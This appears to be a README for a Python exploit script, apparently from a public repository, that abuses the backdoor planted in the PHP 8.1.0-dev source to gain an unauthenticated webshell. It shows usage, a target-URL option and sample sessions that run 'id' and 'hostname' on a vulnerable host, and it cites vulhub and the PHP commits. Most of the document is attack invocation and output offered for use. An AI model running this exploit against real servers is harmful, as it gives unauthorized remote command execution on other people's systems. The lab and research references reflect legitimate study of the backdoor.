# PHP 8.1.0-dev WebShell RCE (Unauthenticated)

> Exploit Code for PHP 8.1.0-dev WebShell RCE (Unauthenticated)

Expected outcome: Exploiting backdoor installed on PHP 8.1.0-dev server thereby obtaining WebShell to execute commands remotely.

Intended only for educational and testing in corporate environments.

This Exploit was tested on Python 3.8.6

### Usage:

```shell
cfx:  ~/Documents/
→ ./exploit.py -h
usage: exploit.py [-h] [-l URL]

PHP 8.1.0-dev WebShell RCE by ColdFusionX

optional arguments:
  -h, --help         show this help message and exit
  -l URL, --url URL  PHP 8.1.0-dev Target URL(Example: http://127.0.0.1)

Exploit Usage : 
./exploit.py -l http://127.0.0.1
[^] WebShell=- id
OR
[^] WebShell=- whoami
```

#### User Inputs :

This exploit expects single arguments to run initially :

- **-l** : PHP 8.1.0-dev Target URL

#### POC

- Scenario 1 : Valid Vulnerable target

```shell
cfx:  ~/Documents/
→ ./exploit.py -l http://127.0.0.1

[+] PHP 8.1.0-dev WebShell RCE by ColdFusionX 
 
Target is running on PHP 8.1.0-dev

*Shoot your commands below* 

[^] WebShell=- id

uid=1000(cfx) gid=1000(cfx) groups=1000(cfx)

[^] WebShell=- hostname

shockwave

[^] WebShell=- ^C
Exiting.
```

- Scenario 2 : Invalid Target

```shell
cfx:  ~/Documents/
→ ./exploit.py -l http://127.0.0.1

[+] PHP 8.1.0-dev WebShell RCE by ColdFusionX 
 
Invalid URL or Target Not Vulnerable
```
## Reference

- https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor
- https://news-web.php.net/php.internals/113838
- https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
- https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
